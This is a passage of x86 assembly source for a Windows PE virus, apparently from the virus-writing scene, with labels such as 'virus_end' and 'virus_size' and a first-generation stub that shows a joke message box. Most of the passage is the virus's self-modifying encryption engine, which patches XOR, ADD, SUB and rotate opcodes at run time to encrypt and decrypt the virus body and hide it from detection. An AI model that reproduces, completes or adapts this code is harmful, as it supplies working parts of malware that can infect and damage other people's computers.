            mov     byte ptr [OperationBlock+ebp+2],03h   ; add esi, eax
            bt      [edi],ebx
            jnc     OperationBlock
            mov     byte ptr [OperationBlock+ebp+2],33h   ; xor esi, eax

OperationBlock:
            db      0ebh,00h            ; Prefetch
            db      033h,0f0h
            pop     ecx
            inc     ebx
            loop    Test_Rotate

            mov     ebx,esi
            pop     esi ecx

            ret


;---------------------------------------------------------------------------

Encrypt64KbBlocks:

            lodsd
            push    esi
            call    EncryptBlock
            pop     esi
            mov     ebx,eax
            lodsd
            push    esi ebx
            call    EncryptBlock        ; So we have them in ebx and eax
            pop     ebx esi
            call    MessTwoBlocks
            ret


;---------------------------------------------------------------------------

StoreOneBlock:

            xchg    eax,ebx
            mov     edi,esi
            sub     edi,8d
            stosd
            mov     eax,ebx             ; We store them two
            stosd
            ret

;---------------------------------------------------------------------------


Encrypt_stuff:

            call    GetBlocksReminder       ; DX is the last one length
            push    dx

CheckLasting:                   ; DX = REMAINDER, CX = NUMBER O BLOCKS
            or      cx,cx                   ; No more ?
            jz      Go_last_block
            call    Encrypt64KbBlocks
            call    StoreOneBlock
            loop    CheckLasting

Go_last_block:
            pop     dx
            cmp     dx,4d               ; Last block shit
            jc      Finished_crypting
            push    esi
            lodsd
            call    EncryptBlock
            pop     edi
            stosd
Finished_crypting:
            ret

    ; Once we have the length, we can start

;---------------------------------------------------------------------------


Encrypt:
            call    Create_Table
            call    Encrypt_stuff
            ret

;---------------------------------------------------------------------------

DeEncryptBlock:

            rol     eax,8d
            push    ecx
            lea     edi,OperationTable+ebp
            mov     ebx,0cfh+12h   ; 10 bits * 24 operations
                                      ;something to adjust
            mov     ecx,24d

MakeRound2:
            push    ecx
            sub     ebx,12h         ; The above adjustment with this
                                    ;allows us to do the encryption
                                    ;algorythm backwards

               ; 34h XOR, 2CH SUB, 04h ADD, C0h C8h ROL, c0h c0h ROR

            mov     dword ptr [EncryptOperation2+ebp],90909090h
            mov     ecx,8d          ; Value to load ( 8 bits )

            bt      [edi],ebx
            jc      XorOrRox2
            inc     ebx
            mov     byte ptr [EncryptOperation2+ebp],04h
            bt      [edi],ebx
            jnc     SubInst2
            add     byte ptr [EncryptOperation2+ebp],028h
SubInst2:   jmp     OpCodeStoredA2

XorOrRox2:
            inc     ebx
            bt      [edi],ebx
            jnc     DealWithXor2

RorOrXor2:
            inc     ebx
            bt      [edi],ebx
            mov     word ptr [EncryptOperation2+ebp],0c0c0h
            jc      MakeRol2         ; IT'S MADE THE 'OTHER' WAY
            add     byte ptr [EncryptOperation2+ebp+1],08h
MakeRol2:
            dec     ecx
                            ; Ecx equ value to load, that is 7 bits for you
            jmp     OpCodeStoredA2


DealWithXor2:   mov     byte ptr [EncryptOperation2+ebp],034h

OpCodeStoredA2:              ; Now it's time to obtain the cypher

            xor     edx,edx

MakeValuesForOperation2:

            inc     ebx             ; points to +2 or +3 in the beggining
            rol     dl,1
            bt      [edi],ebx
            jnc     NoOperand2
            inc     dl
NoOperand2:
            loop    MakeValuesForOperation2
            cmp     byte ptr [EncryptOperation2+1+ebp],90h
            jz      Type1B
            mov     byte ptr [EncryptOperation2+2+ebp],dl
            jmp     EncryptOperation2  ; just in case (testing)
Type1B:     mov     byte ptr [EncryptOperation2+1+ebp],dl
            db      0ebh,00h            ; Prefetch
                    ; One instruction made ( out of 4 )

EncryptOperation2:
            db      90,90,90,90   ; work in AL. One byte excess to fit dword
            rol     eax,8d

            mov     esi,dword ptr ds:[EncryptOperation2+ebp]
            mov     dword ptr ds:[SecondCryptB+ebp],esi
SecondCryptB:
            db      90,90,90,90   ; work in AL. One byte excess to fit dword


            pop     ecx
            dec     ecx
            jz      FinishedCryptBlock2
            jmp     MakeRound2
FinishedCryptBlock2:

            pop     ecx
            ret

;---------------------------------------------------------------------------

DeMessTwoBlocks:

            push    ecx esi

            ; First of all, we get seven bits from the beggining of the
            ;table, that is, the offset relative to the table in bits
            ;to get our value.

            call    GetDl
            mov     byte ptr [@DlHere+ebp],dl

            mov     ebx,0e0h        ; beggining of that last 8 bits
            mov     ecx,04h
@Test_Rotate:
            push    ecx

            dec     ebx

            mov     byte ptr [@OperationBlock+2+ebp],2bh   ; sub esi, eax
            bt      [edi],ebx
            jnc     @OperationBlock
            mov     byte ptr [@OperationBlock+2+ebp],33h   ; xor esi, eax
@OperationBlock:
            db      0ebh,00h
            db      033h,0f0h

            dec     ebx

            bt      [edi],ebx
            jnc     @We_Dont_Rotate

            ; If we do rotate, we do it now, with dl value

            db      0c1h,0c8h
@DlHere:    db      ?

            ; Rotated or not, the second bunch is still in EAX, while
            ;the first one is in ESI. So, we test the second byte.

@We_Dont_Rotate:

            pop     ecx
            loop    @Test_Rotate

            mov     ebx,esi
            pop     esi ecx

            ret




;---------------------------------------------------------------------------


DeEncrypt64KbBlocks:

            ; This function is performed in reverse order than
            ;"Encrypt64KbBlocks", first fixing the block mixing
            ;and later decrypting each block.

            lodsd
            mov     ebx,eax
            lodsd
            call    DeMessTwoBlocks
            xchg    eax,ebx

            push    ebx esi
            call    DeEncryptBlock
            pop     esi ebx
            xchg    eax,ebx
            push    ebx esi
            call    DeEncryptBlock
            pop     esi ebx
            ret

;---------------------------------------------------------------------------


DeEncrypt_stuff:
            call    GetBlocksReminder       ; DX is the last one length
            push    dx
CheckLasting2:                   ; DX = REMAINDER, CX = NUMBER O BLOCKS
            or      cx,cx                   ; No more ?
            jz      Go_last_block2
            call    DeEncrypt64KbBlocks
            call    StoreOneBlock
            loop    CheckLasting2

Go_last_block2:
            pop     dx
            cmp     dx,4d               ; Last block shit
            jc      Thisisfinished
            push    esi
            lodsd
            call    DeEncryptBlock
            pop     edi
            stosd
Thisisfinished:
            ret


;---------------------------------------------------------------------------


Decrypt:
            call    DeEncrypt_stuff
            ret

OperationTable:

            db      31d dup (?)    ; 30 for 24 operations, 1 for last one


virus_end       label   byte
virus_size      equ     virus_end-v_start




;                   FIRST GENERATION ONLY



diff_external   equ     external_first_gen_ops-Decryption

external_first_gen_ops:
                lea     eax,[Kernel32+ebp]      ; GetModuleHandle for the
                push    eax                     ;first virus segregation.
                call    GetModuleHandleA
                mov     dword ptr [GetMHandle+ebp],eax
                sub     dword ptr [external_address+ebp],diff_external
                ret

Kernel32:       db  'KERNEL32.DLL',0

First_out:

                push    MB_ICONEXCLAMATION
                push    offset Azathoth
                push    offset WriteOurText
                push    NULL
                call    MessageBoxA
                call    ExitProcess

WriteOurText:   db      'H0 H0 H0 NOW I HAVE A MACHINE GUN',0


include     Win32api.inc
include     PE.inc

end Start
